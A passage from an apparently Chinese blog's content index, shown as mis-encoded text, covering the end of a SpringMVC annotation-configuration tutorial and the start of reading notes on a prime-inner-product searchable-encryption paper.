/**\n     * æŒ‡å®šSpringMVCçš„é…ç½®ç±»\n     * @return\n     */\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    /**\n     * æŒ‡å®šDispatcherServletçš„æ˜ å°„è§„åˆ™ï¼Œå³url-pattern\n     * @return\n     */\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{\"/\"};\n    }\n\n    /**\n     * æ·»åŠ è¿‡æ»¤å™¨\n     * @return\n     */\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter encodingFilter = new CharacterEncodingFilter();\n        encodingFilter.setEncoding(\"UTF-8\");\n        encodingFilter.setForceRequestEncoding(true);\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{encodingFilter, hiddenHttpMethodFilter};\n    }\n}\n```\n\n### 2ã€åˆ›å»ºSpringConfigé…ç½®ç±»ï¼Œä»£æ›¿springçš„é…ç½®æ–‡ä»¶\n\n```java\n@Configuration\npublic class SpringConfig {\n\t//ssmæ•´åˆä¹‹åï¼Œspringçš„é…ç½®ä¿¡æ¯å†™åœ¨æ­¤ç±»ä¸­\n}\n```\n\n### 3ã€åˆ›å»ºWebConfigé…ç½®ç±»ï¼Œä»£æ›¿SpringMVCçš„é…ç½®æ–‡ä»¶\n\n```java\n@Configuration\n//æ‰«æç»„ä»¶\n@ComponentScan(\"com.atguigu.mvc.controller\")\n//å¼€å¯MVCæ³¨è§£é©±åŠ¨\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    //ä½¿ç”¨é»˜è®¤çš„servletå¤„ç†é™æ€èµ„æº\n    @Override\n    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {\n        configurer.enable();\n    }\n\n    //é…ç½®æ–‡ä»¶ä¸Šä¼ è§£æå™¨\n    @Bean\n    public CommonsMultipartResolver multipartResolver(){\n        return new CommonsMultipartResolver();\n    }\n\n    //é…ç½®æ‹¦æˆªå™¨\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        FirstInterceptor firstInterceptor = new FirstInterceptor();\n        registry.addInterceptor(firstInterceptor).addPathPatterns(\"/**\");\n    }\n    \n    //é…ç½®è§†å›¾æ§åˆ¶\n    \n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController(\"/success\").setViewName(\"success\");\n    }\n    \n    //é…ç½®å¼‚å¸¸æ˜ å°„\n    @Override\n    public void configureHandlerExceptionResolvers(List<HandlerExceptionResolver> resolvers) {\n        SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();\n        Properties prop = new Properties();\n        prop.setProperty(\"java.lang.ArithmeticException\", \"error\");\n        //è®¾ç½®å¼‚å¸¸æ˜ å°„\n        exceptionResolver.setExceptionMappings(prop);\n        //è®¾ç½®å…±äº«å¼‚å¸¸ä¿¡æ¯çš„é”®\n        exceptionResolver.setExceptionAttribute(\"ex\");\n        resolvers.add(exceptionResolver);\n    }\n\n    //é…ç½®ç”Ÿæˆæ¨¡æ¿è§£æå™¨\n    @Bean\n    public ITemplateResolver templateResolver() {\n        WebApplicationContext webApplicationContext = ContextLoader.getCurrentWebApplicationContext();\n        // ServletContextTemplateResolveréœ€è¦ä¸€ä¸ªServletContextä½œä¸ºæ„é€ å‚æ•°ï¼Œå¯é€šè¿‡WebApplicationContext çš„æ–¹æ³•è·å¾—\n        ServletContextTemplateResolver templateResolver = new ServletContextTemplateResolver(\n                webApplicationContext.getServletContext());\n        templateResolver.setPrefix(\"/WEB-INF/templates/\");\n        templateResolver.setSuffix(\".html\");\n        templateResolver.setCharacterEncoding(\"UTF-8\");\n        templateResolver.setTemplateMode(TemplateMode.HTML);\n        return templateResolver;\n    }\n\n    //ç”Ÿæˆæ¨¡æ¿å¼•æ“å¹¶ä¸ºæ¨¡æ¿å¼•æ“æ³¨å…¥æ¨¡æ¿è§£æå™¨\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver) {\n        SpringTemplateEngine templateEngine = new SpringTemplateEngine();\n        templateEngine.setTemplateResolver(templateResolver);\n        return templateEngine;\n    }\n\n    //ç”Ÿæˆè§†å›¾è§£æå™¨å¹¶æœªè§£æå™¨æ³¨å…¥æ¨¡æ¿å¼•æ“\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine) {\n        ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();\n        viewResolver.setCharacterEncoding(\"UTF-8\");\n        viewResolver.setTemplateEngine(templateEngine);\n        return viewResolver;\n    }\n}\n```\n\n### 4ã€æµ‹è¯•åŠŸèƒ½\n\n```java\n@RequestMapping(\"/\")\npublic String index(){\n    return \"index\";\n}\n\n@RequestMapping(\"/testExceptionHandler\")\n@ResponseBody\npublic String testExceptionHandler(){\n    System.out.println(1/0);\n    return \"success\";\n}\n```\n\n##  åä¸‰ã€SpringMVCæ‰§è¡Œæµç¨‹\n\n### 1ã€SpringMVCå¸¸ç”¨ç»„ä»¶\n\n- DispatcherServletï¼š**å‰ç«¯æ§åˆ¶å™¨**ï¼Œä¸éœ€è¦å·¥ç¨‹å¸ˆå¼€å‘ï¼Œç”±æ¡†æ¶æä¾›\n  - ä½œç”¨ï¼šç»Ÿä¸€å¤„ç†è¯·æ±‚å’Œå“åº”ï¼Œæ•´ä¸ªæµç¨‹æ§åˆ¶çš„ä¸­å¿ƒï¼Œç”±å®ƒè°ƒç”¨å…¶å®ƒç»„ä»¶å¤„ç†ç”¨æˆ·çš„è¯·æ±‚\n\n- HandlerMappingï¼š**å¤„ç†å™¨æ˜ å°„å™¨**ï¼Œä¸éœ€è¦å·¥ç¨‹å¸ˆå¼€å‘ï¼Œç”±æ¡†æ¶æä¾›\n  - ä½œç”¨ï¼šæ ¹æ®è¯·æ±‚çš„urlã€methodç­‰ä¿¡æ¯æŸ¥æ‰¾Handlerï¼Œå³æ§åˆ¶å™¨æ–¹æ³•\n\n- Handlerï¼š**å¤„ç†å™¨**ï¼Œéœ€è¦å·¥ç¨‹å¸ˆå¼€å‘\n  - ä½œç”¨ï¼šåœ¨DispatcherServletçš„æ§åˆ¶ä¸‹Handlerå¯¹å…·ä½“çš„ç”¨æˆ·è¯·æ±‚è¿›è¡Œå¤„ç†\n\n- HandlerAdapterï¼š**å¤„ç†å™¨é€‚é…å™¨**ï¼Œä¸éœ€è¦å·¥ç¨‹å¸ˆå¼€å‘ï¼Œç”±æ¡†æ¶æä¾›\n  - ä½œç”¨ï¼šé€šè¿‡HandlerAdapterå¯¹å¤„ç†å™¨ï¼ˆæ§åˆ¶å™¨æ–¹æ³•ï¼‰è¿›è¡Œæ‰§è¡Œ\n\n- ViewResolverï¼š**è§†å›¾è§£æå™¨**ï¼Œä¸éœ€è¦å·¥ç¨‹å¸ˆå¼€å‘ï¼Œç”±æ¡†æ¶æä¾›\n  - ä½œç”¨ï¼šè¿›è¡Œè§†å›¾è§£æï¼Œå¾—åˆ°ç›¸åº”çš„è§†å›¾ï¼Œä¾‹å¦‚ï¼šThymeleafViewã€InternalResourceViewã€RedirectView\n\n- Viewï¼š**è§†å›¾**\n  - ä½œç”¨ï¼šå°†æ¨¡å‹æ•°æ®é€šè¿‡é¡µé¢å±•ç¤ºç»™ç”¨æˆ·\n\n### 2ã€DispatcherServletåˆå§‹åŒ–è¿‡ç¨‹\n\nDispatcherServlet æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª Servletï¼Œæ‰€ä»¥å¤©ç„¶çš„éµå¾ª Servlet çš„ç”Ÿå‘½å‘¨æœŸã€‚æ‰€ä»¥å®è§‚ä¸Šæ˜¯ Servlet ç”Ÿå‘½å‘¨æœŸæ¥è¿›è¡Œè°ƒåº¦ã€‚\n\n...\n\n### 3ã€DispatcherServletè°ƒç”¨ç»„ä»¶å¤„ç†è¯·æ±‚\n\n...\n\n### 4ã€SpringMVCçš„æ‰§è¡Œæµç¨‹\n\n1) ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¯·æ±‚è¢«SpringMVC å‰ç«¯æ§åˆ¶å™¨ DispatcherServletæ•è·ã€‚\n2) DispatcherServletå¯¹è¯·æ±‚URLè¿›è¡Œè§£æï¼Œå¾—åˆ°è¯·æ±‚èµ„æºæ ‡è¯†ç¬¦ï¼ˆURIï¼‰ï¼Œåˆ¤æ–­è¯·æ±‚URIå¯¹åº”çš„æ˜ å°„ï¼š\n\n- a) ä¸å­˜åœ¨\n\n  - i. å†åˆ¤æ–­æ˜¯å¦é…ç½®äº†`mvc:default-servlet-handler`\n\n  - ii. å¦‚æœæ²¡é…ç½®ï¼Œåˆ™æ§åˆ¶å°æŠ¥æ˜ å°„æŸ¥æ‰¾ä¸åˆ°ï¼Œå®¢æˆ·ç«¯å±•ç¤º404é”™è¯¯\n\n  - iii. å¦‚æœæœ‰é…ç½®ï¼Œåˆ™è®¿é—®ç›®æ ‡èµ„æº(ä¸€èˆ¬ä¸ºé™æ€èµ„æºï¼Œå¦‚ï¼šJS,CSS,HTML)ï¼Œæ‰¾ä¸åˆ°å®¢æˆ·ç«¯ä¹Ÿä¼šå±•ç¤º404é”™è¯¯\n\n- b) å­˜åœ¨\n\n  - i. æ ¹æ®è¯¥URIï¼Œè°ƒç”¨HandlerMappingè·å¾—è¯¥Handleré…ç½®çš„æ‰€æœ‰ç›¸å…³çš„å¯¹è±¡(åŒ…æ‹¬Handlerå¯¹è±¡ä»¥åŠHandlerå¯¹è±¡å¯¹åº”çš„æ‹¦æˆªå™¨)ï¼Œæœ€åä»¥HandlerExecutionChainæ‰§è¡Œé“¾å¯¹è±¡çš„å½¢å¼è¿”å›\n  - ii.DispatcherServletæ ¹æ®è·å¾—çš„Handlerï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„HandlerAdapter\n  - iii. å¦‚æœæˆåŠŸè·å¾—HandlerAdapterï¼Œæ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„preHandler(â€¦)æ–¹æ³•ã€æ­£å‘ã€‘\n  - iv. æå–Requestä¸­çš„æ¨¡å‹æ•°æ®ï¼Œå¡«å……Handlerå…¥å‚ï¼Œå¼€å§‹æ‰§è¡ŒHandler(Controller)æ–¹æ³•ï¼Œå¤„ç†è¯·æ±‚ã€‚åœ¨å¡«å……Handlerçš„å…¥å‚è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®ä½ çš„é…ç½®ï¼ŒSpringå°†å¸®ä½ åšä¸€äº›é¢å¤–çš„å·¥ä½œï¼š\n    - a) HttpMessageConveterï¼š å°†è¯·æ±‚æ¶ˆæ¯ï¼ˆå¦‚Jsonã€xmlç­‰æ•°æ®ï¼‰è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºæŒ‡å®šçš„å“åº”ä¿¡æ¯\n    - b) æ•°æ®è½¬æ¢ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®è½¬æ¢ã€‚å¦‚Stringè½¬æ¢æˆIntegerã€Doubleç­‰\n    - c) æ•°æ®æ ¼å¼åŒ–ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®æ ¼å¼åŒ–ã€‚ å¦‚å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ ¼å¼åŒ–æ•°å­—æˆ–æ ¼å¼åŒ–æ—¥æœŸç­‰\n    - d) æ•°æ®éªŒè¯ï¼š éªŒè¯æ•°æ®çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦ã€æ ¼å¼ç­‰ï¼‰ï¼ŒéªŒè¯ç»“æœå­˜å‚¨åˆ°BindingResultæˆ–Errorä¸­\n\n3. Handleræ‰§è¡Œå®Œæˆåï¼Œå‘DispatcherServlet è¿”å›ä¸€ä¸ªModelAndViewå¯¹è±¡\n4. æ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„postHandle(...)æ–¹æ³•ã€é€†å‘ã€‘\n5. æ ¹æ®è¿”å›çš„ModelAndViewï¼ˆæ­¤æ—¶ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¼‚å¸¸ï¼šå¦‚æœå­˜åœ¨å¼‚å¸¸ï¼Œåˆ™æ‰§è¡ŒHandlerExceptionResolverè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼‰é€‰æ‹©ä¸€ä¸ªé€‚åˆçš„ViewResolverè¿›è¡Œè§†å›¾è§£æï¼Œæ ¹æ®Modelå’ŒViewï¼Œæ¥æ¸²æŸ“è§†å›¾\n6. æ¸²æŸ“è§†å›¾å®Œæ¯•æ‰§è¡Œæ‹¦æˆªå™¨çš„afterCompletion(â€¦)æ–¹æ³•ã€é€†å‘ã€‘\n\n7) å°†æ¸²æŸ“ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringMVC"],"categories":["Spring"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šè®ºæ–‡é˜…è¯»2","url":"/posts/31203.html","content":"\n## SEè®ºæ–‡æ¸…å•\n\n| åºå·   | è®ºæ–‡åç§°                                                     | ä½œè€…  <br/>å¹´ä»½       | å•ä½              | æ¥æº         | ç­‰çº§[CCF](https://www.ccf.org.cn/Academic_Evaluation/NIS/) | é“¾æ¥                                                         |\n| ------ | ------------------------------------------------------------ | --------------------- | ----------------- | ------------ | :--------------------------------------------------------: | ------------------------------------------------------------ |\n| 7      | Prime Inner Product Encoding for EffectiveWildcard-based Multi-Keyword Fuzzy Search | åˆ˜å‹¤2020              | æ¹–å—å¤§å­¦          | IEEE TSC     |                             B                              | [åŸæ–‡](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/9184150) |\n| 8      | Enabling Efficient Verifiable Fuzzy Keyword Search Over Encrypted Data in Cloud Computing | è‘›æ–°ç‘      2018      | é’å²›å¤§å­¦          | IEEE Access  |                             â€”â€”                             | [åŸæ–‡](https://ieeexplore.ieee.org/document/8438878)         |\n| 9      | Cuckoo-Filter Based Privacy-Aware Search over Encrypted Cloud Data | è–›æ¸…å¯’2015            | Lehigh University | MSN          |                             C                              | [åŸæ–‡](https://ieeexplore.ieee.org/document/7420926)         |\n| ~~10~~ | ~~VCKSCF: Efficient Verifiable Conjunctive Keyword Search Based on Cuckoo Filter for Cloud Storage~~ | ~~é™ˆå‡¡2021~~          | ~~åä¸œå¸ˆèŒƒå¤§å­¦~~  | ~~TrustCom~~ |                             C                              | [åŸæ–‡](https://ieeexplore.ieee.org/document/9343045)         |\n| 11     | ESVSSE: Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryption | çŸ³æŒ¯å¥2020            | å¹¿è¥¿å¸ˆèŒƒå¤§å­¦      | IEEE TKDE    |                             A                              | [åŸæ–‡](https://ieeexplore.ieee.org/document/9201320)         |\n| 12     | Dynamic Multi-Phrase Ranked Search over Encrypted Data with Symmetric Searchable Encryption | éƒ­æˆ2017              | å¤§è¿ç†å·¥å¤§å­¦      | IEEE TSC     |                             B                              | [åŸæ–‡](https://ieeexplore.ieee.org/document/8089767)         |\n|        |                                                              |                       |                   |              |                                                            |                                                              |\n| -      | VPSearch: Achieving Verifiability for Privacy-Preserving Multi-Keyword Search over Encrypted Cloud Data | ä¸‡å¿—å›½2016            | å±±ä¸œå¤§å­¦          | IEEE TDSC    |                             A                              | [åŸæ–‡](https://ieeexplore.ieee.org/document/7765119)         |\n| -      | A New Lightweight Symmetric Searchable Encryption Scheme for String Identification | Indranil Ghosh   2020 | ä¼¦æ•¦å¤§å­¦          | IEEE TCC     |                             C                              | [åŸæ–‡](https://www.computer.org/csdl/journal/cc/2020/03/08326521/13rRUIJcWn3) |\n\n## â‘¦PIPEæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠPrime Inner Product Encoding for EffectiveWildcard-based Multi-Keyword Fuzzy Searchã€‹**\n\n- ä½œè€…ï¼šåˆ˜å‹¤; äºé¹; è£´æ·‘ç‰; å´æ°; å½­æ¶›; ç‹å›½å†›\n- å•ä½ï¼šæ¹–å—å¤§å­¦\n- åˆŠç‰©ï¼š[IEEE TRANSACTIONS ON SERVICES COMPUTING](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/9184150)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2020å¹´09æœˆ\n- é˜…è¯»å®Œæˆæ—¶é—´ï¼š2022å¹´05æœˆ31æ—¥\n\n### 1ã€æ€»ä½“æ€è·¯\n\næœ¬æ–‡æå‡ºäº†ä¸€ç§**ç´ æ•°å†…ç§¯ç¼–ç **ï¼ˆPIPEï¼‰æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆåˆ©ç”¨**ç´ æ•°çš„ä¸å¯åˆ†è§£æ€§**æ¥æä¾›é«˜æ•ˆã€é«˜ç²¾åº¦ã€çµæ´»çš„**å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢**ã€‚\n\n**ä¸»è¦æ€æƒ³**ï¼šæ˜¯å°†æŸ¥è¯¢å…³é”®å­—æˆ–ç´¢å¼•å…³é”®å­—ç¼–ç ä¸ºå……æ»¡ç´ æ•°æˆ–ç´ æ•°å€’æ•°çš„å‘é‡ï¼Œè¿™æ ·åªæœ‰**å½“ä¸¤ä¸ªå…³é”®å­—ç›¸ä¼¼æ—¶ï¼Œå‘é‡çš„å†…ç§¯çš„ç»“æœæ‰æ˜¯æ•´æ•°**ï¼ˆå› ä¸ºç´ æ•°é™¤äº†1å’Œå®ƒæœ¬èº«æ²¡æœ‰æ­£å› å­ï¼Œæ‰€ä»¥åªæœ‰å½“ä¸¤ä¸ªå…³é”®å­—ç›¸ä¼¼æ—¶ï¼Œå‘é‡å†…ç§¯çš„ç»“æœæ‰æ˜¯æ•´æ•°ï¼‰ã€‚ä¸ºäº†æ”¯æŒå¤šå…³é”®å­—æ¨¡ç³Šæœç´¢ï¼Œå°†å…³é”®å­—å‘é‡ç»„ç»‡æˆçŸ©é˜µï¼Œå¹¶åˆ©ç”¨**çŸ©é˜µä¹˜æ³•**æ¥æ”¯æŒand/oræŸ¥è¯¢ã€‚\n\n- é¦–å…ˆæ„å»ºäº†åœ¨å·²çŸ¥å¯†æ–‡æ¨¡å‹ä¸­å®‰å…¨çš„ **PIPE0 æ–¹æ¡ˆ**ã€‚ä¸éš¾ä»¥åŒæ—¶**æ”¯æŒ AND å’Œ OR** è¯­ä¹‰çš„ç°æœ‰ä½œå“ä¸åŒï¼ŒPIPE0 ä½¿ç”¨æˆ·èƒ½å¤Ÿçµæ´»åœ°åœ¨å…¶æŸ¥è¯¢ä¸­**æŒ‡å®šä¸åŒçš„æœç´¢è¯­ä¹‰**ã€‚\n\n- ç„¶åæ„é€ äº† **PIPES æ–¹æ¡ˆ**ï¼Œå·§å¦™åœ°å°†**éšæœºå™ªå£°**æ·»åŠ åˆ°æŸ¥è¯¢å‘é‡ä¸­ï¼Œä»¥**æŠµåˆ¶çº¿æ€§åˆ†æ**ã€‚ç†è®ºåˆ†æå’Œå®éªŒç»“æœéƒ½è¯æ˜äº†è¯¥æ–¹æ¡ˆçš„æœ‰æ•ˆæ€§ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- ç´ æ•°å†…ç§¯ç¼–ç \n- ç¼–è¾‘è·ç¦»\n- å®‰å…¨kè¿‘é‚»æ–¹æ¡ˆï¼ˆSecure k-Nearest Neighbor Schemeï¼‰\n\n  - `â‹†`çŸ©é˜µä¹˜æ³•\n\n  - `Â·`å‘é‡å†…ç§¯\n\n**EncI(p, sk)â†’p'**ï¼šå°†ç´¢å¼•å‘é‡ p âˆˆ R<sup>dÂ </sup>åˆ†æˆä¸¤ä¸ªå‘é‡(p<sub>a</sub>, p<sub>b</sub>)ï¼Œå¦‚ä¸‹:\n\n- for i = 1 to d\n\n  - å¦‚æœ s[i] = 1ï¼Œp[i] éšæœºåˆ†æˆ p<sub>a</sub>[i]ï¼Œ p<sub>b</sub>[i]ï¼Œä½¿ p<sub>a</sub>[i] + p<sub>b</sub>[i] = p[i];\n\n  - å¦‚æœ s[i] = 0ï¼Œp<sub>a</sub>[i] å’Œ p<sub>b</sub>[i] éƒ½è®¾ç½®ä¸º p[i]ã€‚\n\n- åŠ å¯† (p<sub>a</sub>, p<sub>b</sub>) å¹¶è¾“å‡º p' = (p'<sub>a</sub>, p'<sub>b</sub>)ï¼Œå…¶ä¸­ (**p'<sub>a</sub> = M<sub>1</sub><sup>T</sup>â‹†p<sub>a</sub>ï¼Œp'<sub>b</sub> =  M<sub>2</sub><sup>T</sup>â‹†p<sub>b</sub>**)ã€‚\n\n**EncQ(q, sk) â†’ q'** : å°†æŸ¥è¯¢å‘é‡ qâˆˆR<sup>d </sup>åˆ†å‰²ä¸ºä¸¤ä¸ªå‘é‡(q<sub>a</sub>, q<sub>b</sub>)ï¼Œå¦‚ä¸‹:\n\n- for i = 1 to d\n  - å¦‚æœ s[i] = 1ï¼Œåˆ™ q<sub>a</sub>[i] å’Œ q<sub>b</sub>[i] éƒ½è®¾ç½®ä¸º q[i];\n  - å¦‚æœ s[i] = 0ï¼Œåˆ™ q[i] éšæœºåˆ†æˆ q<sub>a</sub>[i]ï¼Œ q<sub>b</sub>[i]ï¼Œä½¿ q<sub>a</sub>[i] + q<sub>b</sub>[i] = q[i]ã€‚\n- åŠ å¯† (q<sub>a</sub>, q<sub>b</sub>) å¹¶è¾“å‡º q' = (q'<sub>a</sub>, q'<sub>b</sub>)ï¼Œå…¶ä¸­ (**q'<sub>a</sub> = M<sub>1</sub><sup>-1</sup>â‹†q<sub>a</sub>ï¼Œq'<sub>b</sub> =  M<sub>2</sub><sup>-1</sup>â‹† <sub>b</sub>**)ã€‚\n\n**Search(p'ï¼Œq')â†’v**ï¼šè®¡ç®— v = p'<sub>a</sub>Â·q'<sub>a</sub> + p'<sub>b</sub>Â·q'<sub>b</sub> ä½œä¸ºæœç´¢ç»“æœã€‚æ³¨æ„:\n\np' Â· q'  = p'<sub>a</sub>ï¼ˆè¡Œå‘é‡ï¼‰Â·q'<sub>a</sub> + p'<sub>b</sub>Â·q'<sub>b</sub>\n\n= p'<sub>a</sub><sup>T</sup>Â·q'<sub>a</sub> + p'<sub>b</sub><sup>T</sup>Â·q'<sub>b</sub>\n\n= (M<sub>1</sub><sup>T</sup>â‹†p<sub>a</sub>)<sup>T</sup> Â· (M<sub>1</sub><sup>-1</sup>â‹†q<sub>a</sub>) + (M<sub>2</sub><sup>T</sup>â‹†p<sub>b</sub>)<sup>T</sup> Â· (M<sub>2</sub><sup>-1</sup>â‹†q<sub>b</sub>) \n\n= p<sub>a</sub><sup>T</sup> â‹† q<sub>a</sub> + p<sub>b</sub><sup>T</sup>â‹† q<sub>b</sub>\n\n= p<sup>T</sup>â‹† q\n\n= p Â· q\n\nå› æ­¤ï¼ŒåŠ å¯†åçš„å‘é‡çš„å†…ç§¯å’Œç­‰ä»·äºåŸå§‹å‘é‡çš„å†…ç§¯ã€‚\n\n### 3ã€æ–¹æ¡ˆå®ç°\n\nPIPE0=(GenKey<sub>0</sub>, BuildIndex<sub>0</sub>, Trapdoor<sub>0</sub>, Search<sub>0</sub>)\n\n#### å¯†é’¥ç”Ÿæˆç®—æ³•\n\n**SK â† GenKey<sub>0</sub>(1<sup>k</sup>)** ç”Ÿæˆå¯†é’¥ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š\n\n- ç»™å®šå®‰å…¨å‚æ•° Îºï¼Œäº‘ç”¨æˆ·è¿è¡Œ KNN.Key(1<sup>k</sup>) æ¥ç”Ÿæˆ sk = (M<sub>1</sub>, M<sub>2</sub>, s)\n- éšæœºé€‰æ‹©ä¸€ä¸ª é•¿åº¦ L ç´ æ•°åºåˆ— P = (p<sub>1</sub>ï¼Œâ€¦ï¼Œ p<sub>L</sub>)ï¼Œä¸€ä¸ªç”± L ä¸ªè™šæ‹Ÿå­—ç¬¦ç»„æˆçš„å­—å…¸ S = (s<sub>1</sub>ï¼Œâ€¦ï¼Œ s<sub>L</sub>)ï¼Œä½¿ S âˆ© A = âˆ…ï¼Œå’Œ k ä½å­—ç¬¦ä¸² k<sub>f</sub>\n  - k âˆˆ N æ˜¯å®‰å…¨å‚æ•°\n  - A æ˜¯ 26ä¸ªè‹±æ–‡å­—æ¯æ„æˆçš„å­—å…¸\n  - L = max(||w<sub>1</sub>||ï¼Œâ€¦ï¼Œ||w<sub>m</sub>||) æ˜¯å…³é”®å­—çš„æœ€å¤§é•¿åº¦\n  - RPFï¼šF:{0,1}<sup>k</sup> x {0,1}<sup>*</sup>â†’ {0,1}<sup>k</sup>\n- å¯†é’¥ SK ä¸º(skï¼Œk<sub>f</sub>ï¼ŒPï¼ŒS)\n\n#### ç´¢å¼•ç”Ÿæˆç®—æ³•\n\n **I<sub>i</sub> â† BuildIndex<sub>0</sub>(W<sub>i</sub>,SK)** ç”Ÿæˆç´¢å¼•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š\n\n- å…·æœ‰ m<sub>i</sub> å…³é”®å­—çš„æ–‡ä»¶ D<sub>i</sub> æ–‡ä»¶çš„å…³é”®å­—é›†åˆ W<sub>i</sub> = {W<sub>i,1</sub>ï¼Œ . .ï¼Œ w<sub>i,m<sub>i</sub></sub>}ï¼Œäº‘ç”¨æˆ·æ„å»º ï½œm<sub>i</sub>ï½œÃ— d çŸ©é˜µ A<sub>i</sub>\n  - 1)å¯¹äºk âˆˆ [m<sub>i</sub>]ï¼Œè¿è¡Œ**ç®—æ³•1**ä¸º W<sub>i</sub> ä¸­çš„ç¬¬ k ä¸ªå…³é”®å­— w<sub>i,k</sub> è¾“å‡º d ç»´å‘é‡ p<sub>i,k</sub>\n  - 2)å¯¹äºk âˆˆ [m<sub>i</sub>]ï¼Œè®¾ç½® A<sub>i</sub>\\[k]\\[âˆ—] â† P<sub>i,k</sub>\n\n- å¯¹äº k âˆˆ [m<sub>i</sub>]ï¼Œè¿è¡Œ KNN.EncI(A<sub>i</sub>\\[k][âˆ—]ï¼Œsk) åŠ å¯†çŸ©é˜µ A<sub>i</sub> çš„ç¬¬ k è¡Œå¹¶è¾“å‡ºä¸€å¯¹åŠ å¯†å‘é‡ (A'<sub>i<sub>a</sub></sub>\\[k][âˆ—]ï¼ŒA'<sub>i<sub>b</sub></sub>\\[k][âˆ—]) ã€‚åŠ å¯†ç´¢å¼• I<sub>i</sub> è®¾ä¸ºä¸€å¯¹åŠ å¯†çŸ©é˜µ A'<sub>i</sub>= (A'<sub>i<sub>a</sub></sub>ï¼ŒA'<sub>i<sub>b</sub></sub>)\n\n![ç®—æ³•1](https://img.jwt1399.top/img/image-20220324114026256.png)\n\n- ç¬¬ä¸€æ­¥(ç¬¬1-2è¡Œ)ï¼šç”¨ S ä¸­å…ƒç´ å¡«å……æ¯ä¸ªå…³é”®å­—ï¼Œä»¥éšè—å…¶çœŸæ­£çš„é•¿åº¦ã€‚ç”¨ L è¡¨ç¤ºé€šç”¨å…³é”®å­—çš„æœ€å¤§é•¿åº¦ã€‚å¡«å……ä¹‹åï¼Œæ¯ä¸ªå…³é”®å­—çš„é•¿åº¦éƒ½ç­‰äº L ã€‚\n- ç¬¬äºŒæ­¥(ç¬¬3-4è¡Œ)ï¼šç”¨ 1 åˆå§‹åŒ–ç´¢å¼•å‘é‡çš„æ¯ä¸ªå…ƒç´ ã€‚\n- ç¬¬ä¸‰æ­¥(ç¬¬5-7è¡Œ)ï¼šå°†æŒ‡å®šç´ æ•°çš„å€’æ•°æ”¾åœ¨ç´¢å¼•å‘é‡çš„é€‚å½“ä½ç½®ã€‚å¯¹äºå…³é”®å­— w<sub>i,kÂ </sub>çš„ç¬¬ l ä¸ªå­—ç¬¦ w<sub>i,k</sub>[l]ï¼Œå¯¹åº”çš„ç´ æ•°ä¸º p<sub>l</sub>ï¼Œå¯¹åº”çš„ä½ç½®è®¡ç®—ä¸º pos<sub>l</sub> = F<sub>kf</sub> (w<sub>i,k</sub>[l])ã€‚å› æ­¤ï¼Œå¯¹äº lâˆˆ[l]ï¼Œ p<sub>i,k </sub>[pos<sub>l</sub>] å°†ä¹˜ä»¥ 1/p<sub>l</sub>ã€‚\n- ç¬¬å››æ­¥(ç¬¬8è¡Œ)ï¼šä¸ºäº†å¢åŠ å†…ç§¯ç»“æœçš„éšæœºæ€§ï¼Œç”¨éšæœºæ•° z âˆˆ [d - L] å¡«å……å‰©ä½™éƒ¨åˆ†å…ƒç´ 